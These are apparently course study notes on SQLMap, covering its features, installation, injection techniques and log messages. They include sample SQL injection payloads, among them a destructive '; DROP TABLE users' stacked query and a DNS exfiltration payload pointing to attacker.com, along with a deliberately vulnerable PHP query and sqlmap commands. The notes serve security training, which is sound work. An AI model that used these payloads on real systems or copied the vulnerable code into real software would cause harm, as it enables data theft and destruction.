## 1-SQLMap Overview
SQLMap is an open-source Python tool that automates detection and exploitation of SQL injection flaws (active since 2006). It includes a detection engine, many options for fine-tuning, and supports exploitation features from DB fingerprinting to OS command execution.

```bash
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```
sqlmap runs checks: connection, WAF detection, content stability, parameter dynamism, DBMS heuristics, etc.
###  Features 
- Target connection handling and HTTP options
- Injection detection and DBMS fingerprinting
- Enumeration of DB content (databases, tables, columns, data)
- File system access and SELECT/INTO/LOAD_FILE usage
- Execution of OS commands via SQLi (where supported)
- Optimization and protection detection; tamper scripts for bypasses
###  Installation
Install quickly on Linux or clone repo
Debian package:
```bash
  sudo apt install sqlmap
```
Manual install (latest dev):
```bsah
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
python sqlmap.py
```

###  Supported DBMS 
Wide DB support (not exhaustive)
**MySQL, MariaDB, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, IBM DB2, Firebird, Sybase, HSQLDB, CockroachDB, TiDB, MemSQL, Amazon Redshift, Vertica, Presto, Apache Derby, Greenplum, and more.**
###  Supported SQLi Techniques (BEUSTQ)
The default technique set: Boolean, Error, Union, Stacked, Time, Inline
##### Boolean-based blind
```sql
AND 1=1
```
Detects TRUE vs FALSE by comparing responses; retrieves data incrementally (1 byte/bit per request).
##### Error-based
```sql
AND GTID_SUBSET(@@version,0)
```
Uses DB error messages to leak data. Fast when the DB returns useful errors. Covers many DBMS-specific payloads.
##### UNION query-based
```sql
  UNION ALL SELECT 1,@@version,3
```
Extends original query output with injected results. Fast when original output is rendered and column types/counts match.
##### Stacked queries
```sql
; DROP TABLE users
```
Appends additional SQL statements (requires DB/platform support for stacking; used for non-query statements).
##### Time-based blind
```sql
AND 1=IF(2>1,SLEEP(5),0)
```
Uses response delay to infer TRUE/FALSE. Slower than boolean-based blind but works when boolean-based is not applicable.
##### Inline queries
```sql
SELECT (SELECT @@version) FROM ...
```
Embeds a subquery inside the original query. Less common but supported.
##### Out-of-band (OOB) / DNS exfiltration
```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```
Uses external channels (DNS/HTTP) to exfiltrate results when direct channels are unavailable. Requires control of the receiving DNS/HTTP service.



---


## 2-Getting Started with SQLMap
SQLMap provides two help levels: basic (-h) and advanced (-hh). These help users understand essential and extended functionality.
```bash
sqlmap -h # Basic help:
sqlmap -hh # Advanced help:
# -u  Target URL
# -d  Direct DB connection string
# -l  Parse Burp/WebScarab logs
# -m  Scan multiple targets from file
# -r  Load full HTTP request from file
# -g  Use Google dork results as targets
# -c  Load options from config file
```
#### Basic Usage Scenario
A web app takes user input via GET parameter (e.g., id). If vulnerable, SQLMap can detect SQLi, enumerate DB, access files, or execute OS commands.

Example vulnerable PHP code:
```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("SQL error: ". mysqli_error($link));
```
Visible SQL errors simplify detection.
#### Running SQLMap in Practice

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
  # '--batch' is used for skipping any required user-input, by automatically choosing using the default option.
```



---




#### SQLMap Output Description
Understanding SQLMap output helps identify what type of SQLi was found and how SQLMap is exploiting it.
#### URL content is stable
Log Message: **target URL content is stable**
Means responses do not change between identical requests. Easier to compare differences caused by SQLi payloads.
#### Parameter appears to be dynamic
Log Message: **GET parameter 'id' appears to be dynamic**
The tested parameter affects the response. Indicates possible DB interaction.
#### Parameter might be injectable
Log Message: **heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')**
DBMS errors appeared from invalid payloads. Indicates potential SQLi but not yet confirmed.
#### Parameter might be vulnerable to XSS attacks
Log Message: **heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks**
SQLMap performs a quick heuristic XSS test alongside SQLi checks.
#### Back-end DBMS is '...'
Log Message: **it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]**
SQLMap suggests limiting tests only to the detected DBMS.
#### Level/risk values
Log Message: **for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]**
Extend testing depth for the confirmed DBMS.
#### Reflective values found
Log Message: **reflective value(s) found and filtering out**
SQLMap filters junk values reflected back into responses.
#### Parameter appears to be injectable
Log Message: **GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")**
Injection likely confirmed using boolean-based technique and keyword detection.
#### Time-based comparison statistical model
Log Message: **time-based comparison requires a larger statistical model, please wait........... (done)**
SQLMap collects timing samples to detect time delays accurately.
#### Extending UNION query injection technique tests
Log Message: **automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found**
SQLMap increases UNION test attempts due to a high chance of success.
#### Technique appears to be usable
Log Message: **ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test**
ORDER BY helped SQLMap find UNION column count faster.
#### Parameter is vulnerable
Log Message: **GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]**
SQL injection vulnerability confirmed.
#### Sqlmap identified injection points
Log Message: **sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:**
Final detailed proof showing payloads and techniques.
#### Data logged to text files
Log Message: **fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'**
All output saved locally for later use and faster repeated exploitation.
